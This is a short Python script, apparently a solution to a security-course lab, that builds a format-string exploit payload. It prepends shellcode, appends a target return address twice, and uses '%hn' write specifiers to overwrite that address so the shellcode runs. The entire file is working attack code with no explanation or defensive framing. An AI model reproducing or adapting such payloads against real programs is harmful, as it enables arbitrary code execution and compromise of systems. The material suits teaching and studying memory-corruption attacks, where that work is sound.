#!/usr/bin/env python3

import sys
from shellcode import shellcode
from struct import pack

# Your code here
ret_addr = 0xfffed70c
payload = shellcode + b'A'
payload += pack('<I', ret_addr)
payload += pack('<I', ret_addr + 2)
payload += b'%52960x%10$hn'
payload += b'%12542x%11$hn'

sys.stdout.buffer.write(payload)
